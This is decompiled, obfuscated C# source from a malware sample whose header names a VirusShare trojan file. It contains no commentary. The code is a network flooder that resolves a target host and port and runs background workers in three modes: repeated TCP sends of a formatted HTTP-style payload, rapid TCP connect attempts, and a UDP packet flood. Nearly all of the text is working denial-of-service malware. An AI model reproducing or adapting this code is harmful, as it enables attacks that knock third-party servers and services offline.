// Decompiled with JetBrains decompiler
// Type: M6-n. i>O.+.&#E^
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008;
using M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0015\u002B;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0015\u002B
{
  internal class \u0026\u000D\u0023\u0015E\u005E
  {
    private static \u0026\u000D\u0023\u0015E\u005E.\u0002\u002F\u0016 \u0038\u002EJ\u0017\u0014I\u007D;
    private static IPEndPoint pZ\u0016F;
    private static byte[] Cm\u001F\u0019\u000FR;
    private static uint o\u0007\u000F\u002C = 2;
    private static BackgroundWorker[] \u0024\u0005\u0009\u000F\u0021dWQ;

    public static void \u007CG(
      \u0026\u000D\u0023\u0015E\u005E.\u002D\u0010\u003D\u001A\u000A\u003Cf\u0016 _param0,
      string[] _param1)
    {
      \u0026\u000D\u0023\u0015E\u005E.\u0014\u001AQ\u002A();
      string str1 = Convert.ToString(_param1[0]);
      ushort uint16 = Convert.ToUInt16(_param1[1]);
      string empty = string.Empty;
      switch (_param0)
      {
        case \u0026\u000D\u0023\u0015E\u005E.\u002D\u0010\u003D\u001A\u000A\u003Cf\u0016.\u001F\u0007O\u002F\u003B:
          string str2 = _param1.Length >= 3 ? Convert.ToString(_param1[2]) : \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0032Q\u000F\u00400z\u000F0();
          \u0026\u000D\u0023\u0015E\u005E.Cm\u001F\u0019\u000FR = Encoding.ASCII.GetBytes(string.Format(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.H\u000F\u0001A\u0016(), (object) str1, (object) str2, (object) m\u003D\u000D.\u0005\u0020\u001E7, (object) VG.y0\u003F.Next(200, 300), (object) Environment.NewLine));
          \u0026\u000D\u0023\u0015E\u005E.\u0038\u002EJ\u0017\u0014I\u007D = new \u0026\u000D\u0023\u0015E\u005E.\u0002\u002F\u0016(\u0026\u000D\u0023\u0015E\u005E.Q\u001B);
          break;
        case \u0026\u000D\u0023\u0015E\u005E.\u002D\u0010\u003D\u001A\u000A\u003Cf\u0016.\u0026\u000D\u001A\u00037:
          \u0026\u000D\u0023\u0015E\u005E.Cm\u001F\u0019\u000FR = (byte[]) null;
          \u0026\u000D\u0023\u0015E\u005E.\u0038\u002EJ\u0017\u0014I\u007D = new \u0026\u000D\u0023\u0015E\u005E.\u0002\u002F\u0016(\u0026\u000D\u0023\u0015E\u005E.\u000A1Q);
          break;
        case \u0026\u000D\u0023\u0015E\u005E.\u002D\u0010\u003D\u001A\u000A\u003Cf\u0016.I\u0013\u0027Y1:
          \u0026\u000D\u0023\u0015E\u005E.Cm\u001F\u0019\u000FR = new byte[256];
          \u0026\u000D\u0023\u0015E\u005E.\u0038\u002EJ\u0017\u0014I\u007D = new \u0026\u000D\u0023\u0015E\u005E.\u0002\u002F\u0016(\u0026\u000D\u0023\u0015E\u005E.\u00801);
          break;
      }
      try
      {
        \u0026\u000D\u0023\u0015E\u005E.pZ\u0016F = new IPEndPoint(Dns.GetHostEntry(str1).AddressList[0], (int) uint16);
      }
      catch
      {
        \u0026\u000D\u0023\u0015E\u005E.pZ\u0016F = new IPEndPoint(IPAddress.Parse(str1), (int) uint16);
      }
      \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ = new BackgroundWorker[(IntPtr) \u0026\u000D\u0023\u0015E\u005E.o\u0007\u000F\u002C];
      for (int index = 0; (long) index < (long) \u0026\u000D\u0023\u0015E\u005E.o\u0007\u000F\u002C; ++index)
      {
        \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ[index] = new BackgroundWorker();
        \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ[index].DoWork += new DoWorkEventHandler(\u0026\u000D\u0023\u0015E\u005E.\u0038\u002EJ\u0017\u0014I\u007D.Invoke);
        \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ[index].WorkerSupportsCancellation = true;
        \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ[index].RunWorkerAsync();
      }
    }

    public static void \u0014\u001AQ\u002A()
    {
      try
      {
        for (int index = 0; (long) index < (long) \u0026\u000D\u0023\u0015E\u005E.o\u0007\u000F\u002C; ++index)
        {
          \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ[index].CancelAsync();
          \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ[index].Dispose();
        }
        \u0026\u000D\u0023\u0015E\u005E.\u0024\u0005\u0009\u000F\u0021dWQ = (BackgroundWorker[]) null;
        \u0026\u000D\u0023\u0015E\u005E.pZ\u0016F = (IPEndPoint) null;
      }
      catch
      {
      }
    }

    private static void Q\u001B(object _param0, DoWorkEventArgs _param1)
    {
      while (!(_param0 as BackgroundWorker).CancellationPending)
      {
        try
        {
          using (Socket socket = new Socket(\u0026\u000D\u0023\u0015E\u005E.pZ\u0016F.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
          {
            ReceiveTimeout = 10
          })
          {
            try
            {
              socket.Connect((EndPoint) \u0026\u000D\u0023\u0015E\u005E.pZ\u0016F);
            }
            catch
            {
              continue;
            }
            socket.Send(\u0026\u000D\u0023\u0015E\u005E.Cm\u001F\u0019\u000FR);
          }
        }
        catch
        {
        }
        Thread.Sleep(30);
      }
    }

    private static void \u000A1Q(object _param0, DoWorkEventArgs _param1)
    {
      while (!(_param0 as BackgroundWorker).CancellationPending)
      {
        try
        {
          using (Socket state = new Socket(\u0026\u000D\u0023\u0015E\u005E.pZ\u0016F.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
          {
            state.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, true);
            state.BeginConnect((EndPoint) \u0026\u000D\u0023\u0015E\u005E.pZ\u0016F, new AsyncCallback(\u0026\u000D\u0023\u0015E\u005E.\u00066\u0020\u000FK\u002A3), (object) state);
          }
        }
        catch
        {
        }
        Thread.Sleep(50);
      }
    }

    private static void \u00801(object _param0, DoWorkEventArgs _param1)
    {
      Socket socket = new Socket(\u0026\u000D\u0023\u0015E\u005E.pZ\u0016F.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
      while (!(_param0 as BackgroundWorker).CancellationPending)
      {
        try
        {
          socket.SendTo(\u0026\u000D\u0023\u0015E\u005E.Cm\u001F\u0019\u000FR, (EndPoint) \u0026\u000D\u0023\u0015E\u005E.pZ\u0016F);
        }
        catch
        {
        }
        Thread.Sleep(50);
      }
    }

    private static void \u00066\u0020\u000FK\u002A3(IAsyncResult _param0)
    {
      try
      {
        ((Socket) _param0.AsyncState).Close();
      }
      catch
      {
      }
    }

    private delegate void \u0002\u002F\u0016(object _param1, DoWorkEventArgs _param2);

    public enum \u002D\u0010\u003D\u001A\u000A\u003Cf\u0016
    {
      \u001F\u0007O\u002F\u003B,
      \u0026\u000D\u001A\u00037,
      I\u0013\u0027Y1,
    }
  }
}
